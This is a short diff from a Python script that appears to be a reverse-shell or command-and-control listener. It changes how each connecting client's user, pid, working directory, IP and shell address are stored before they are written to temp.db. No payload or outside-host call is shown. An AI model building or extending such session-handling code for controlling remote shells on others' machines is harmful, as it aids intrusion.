@@ -72,7 +72,7 @@ while True:
         client_ip = req_head.get('ip')
 
         cprint.warn(f'Connected from {client_ip} with alias {alias}')
-        c = (user, pid, pwd, client_ip, shell_address, str(alias))
+        c = {"user_cle": user, "pid_cle": pid, "pwd_cle": pwd, "clientip_cle": client_ip, "server_address": shell_address, "alias_cle": str(alias)}
         clients[str(alias)] = c
         alias += 1
         with open("temp.db", "w") as f:
